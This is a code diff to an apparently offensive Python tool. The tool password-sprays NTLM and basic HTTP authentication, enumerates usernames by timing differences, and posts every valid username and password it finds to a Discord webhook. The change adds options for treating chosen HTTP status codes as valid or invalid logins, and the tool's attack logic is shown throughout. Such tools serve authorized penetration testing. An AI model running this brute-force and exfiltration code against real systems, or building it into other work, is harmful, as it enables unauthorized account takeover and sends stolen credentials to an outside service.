@@ -14,6 +14,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 from multiprocessing import Pool
 
+
 def send_discord_notification(webhook_url, message, color=0x00ff00):
     """Send a notification to Discord using webhook"""
     if not webhook_url:
@@ -34,6 +35,7 @@ def send_discord_notification(webhook_url, message, color=0x00ff00):
         requests.post(webhook_url, json=data)
     except Exception as e:
         print(f"Failed to send Discord notification: {e}")
+
 
 def get_baseline_timing(url, domain, authtype, proxies):
     """Get baseline timings for valid (guest) and invalid (random) usernames"""
@@ -82,6 +84,7 @@ def get_baseline_timing(url, domain, authtype, proxies):
     
     return avg_guest, avg_invalid
 
+
 def check_creds_timing_only(opts):
     """Check credentials and return only timing (for baseline establishment)"""
     url, domain, username, password, authtype, proxies, track_time, verbose, webhook_url = opts
@@ -115,6 +118,7 @@ def check_creds_timing_only(opts):
     except Exception as e:
         print(f"[ERROR] {username}: {e}")
         return None
+
 
 def check_username_enum(opts):
     """Check if username is valid based on timing attack"""
@@ -178,8 +182,21 @@ def check_username_enum(opts):
     
     return None
 
+
 def check_creds(opts):
-    url, domain, username, password, authtype, proxies, track_time, verbose, webhook_url = opts
+    (
+        url,
+        domain,
+        username,
+        password,
+        authtype,
+        proxies,
+        track_time,
+        verbose,
+        webhook_url,
+        valid_codes,
+        invalid_codes,
+    ) = opts
 
     headers = {}
     if authtype == "ntlm":
@@ -207,20 +224,37 @@ def check_creds(opts):
         timeB = time()
         elapsedTimeMs = round((timeB - timeA) * 1000, 2)
 
-        if res.status_code != 401:
+        status_code = res.status_code
+
+        # Decide validity based on status code, with overrides
+        # Priority:
+        #   1) If status_code is explicitly invalid -> FAILED
+        #   2) Else if explicitly valid -> VALID
+        #   3) Else fall back to default: 401 = FAILED, everything else = VALID
+        if status_code in invalid_codes:
+            is_valid = False
+        elif valid_codes and status_code in valid_codes:
+            is_valid = True
+        else:
+            # Default behavior: only 401 is failure
+            is_valid = status_code != 401
+
+        code_suffix = f" ({status_code})" if verbose else ""
+
+        if is_valid:
             status = "[VALID]"
             if track_time:
-                output = f"{status} {username}:{password}  - {elapsedTimeMs}ms"
+                output = f"{status} {username}:{password}{code_suffix}  - {elapsedTimeMs}ms"
             else:
-                output = f"{status} {username}:{password}"
+                output = f"{status} {username}:{password}{code_suffix}"
             
-            print(f"{output}")
+            print(output)
             
             # Send Discord notification for valid credentials
             if webhook_url:
                 send_discord_notification(
                     webhook_url,
-                    f"Valid credentials found!\nUsername: {username}\nPassword: {password}",
+                    f"Valid credentials found!\nUsername: {username}\nPassword: {password}\nHTTP Status: {status_code}",
                     color=0x00ff00
                 )
             
@@ -229,10 +263,10 @@ def check_creds(opts):
         else:
             status = "[FAILED]"
             if track_time:
-                output = f"{status} {username}:{password}  - {elapsedTimeMs}ms"
+                output = f"{status} {username}:{password}{code_suffix}  - {elapsedTimeMs}ms"
                 print(output)
             else:
-                output = f"{status} {username}:{password}"
+                output = f"{status} {username}:{password}{code_suffix}"
                 if verbose:
                     print(output)
 
@@ -240,6 +274,27 @@ def check_creds(opts):
         status = "[ERROR]"
         output = f"{status} {username}:{password}: {e}"
         print(output)
+
+
+def parse_status_codes(code_str):
+    """
+    Parse a comma-separated list of status codes into a set of ints.
+    Ignores invalid entries and empty strings.
+    """
+    codes = set()
+    if not code_str:
+        return codes
+
+    for part in code_str.split(","):
+        part = part.strip()
+        if not part:
+            continue
+        try:
+            codes.add(int(part))
+        except ValueError:
+            print(f"[WARN] Ignoring invalid status code in list: '{part}'")
+    return codes
+
 
 if __name__ == "__main__":
     args = argparse.ArgumentParser()
@@ -301,7 +356,21 @@ if __name__ == "__main__":
         "--enum-threshold", help="Timing threshold in ms for username enumeration (default: 500)", 
         type=int, default=500
     )
+    args.add_argument(
+        "--valid-respcode",
+        help="Comma-separated HTTP status codes to explicitly treat as valid (e.g. 200,301,302,403)",
+        default=""
+    )
+    args.add_argument(
+        "--invalid-respcode",
+        help="Comma-separated HTTP status codes to explicitly treat as invalid (e.g. 401,500)",
+        default=""
+    )
+
     opts = args.parse_args()
+
+    valid_codes = parse_status_codes(opts.valid_respcode)
+    invalid_codes = parse_status_codes(opts.invalid_respcode)
 
     if opts.proxy and opts.authtype == "basic":
         proxies = {"http": opts.proxy, "https": opts.proxy}
@@ -423,8 +492,17 @@ if __name__ == "__main__":
             for i, p in enumerate(pw):
                 attack_sets[i].append(
                     (
-                        opts.url, opts.domain, u, p, opts.authtype, proxies, 
-                        opts.add_response, opts.verbose, opts.webhook
+                        opts.url,
+                        opts.domain,
+                        u,
+                        p,
+                        opts.authtype,
+                        proxies,
+                        opts.add_response,
+                        opts.verbose,
+                        opts.webhook,
+                        valid_codes,
+                        invalid_codes,
                     )
                 )
         print(f"{mx} Attack Sets Created from User Pass file")
@@ -493,8 +571,19 @@ if __name__ == "__main__":
                 )
             
             attempts = [
-                (opts.url, opts.domain, u, p, opts.authtype, proxies, 
-                 opts.add_response, opts.verbose, opts.webhook)
+                (
+                    opts.url,
+                    opts.domain,
+                    u,
+                    p,
+                    opts.authtype,
+                    proxies,
+                    opts.add_response,
+                    opts.verbose,
+                    opts.webhook,
+                    valid_codes,
+                    invalid_codes,
+                )
                 for u in usernames
             ]
             with Pool(opts.threads) as p:
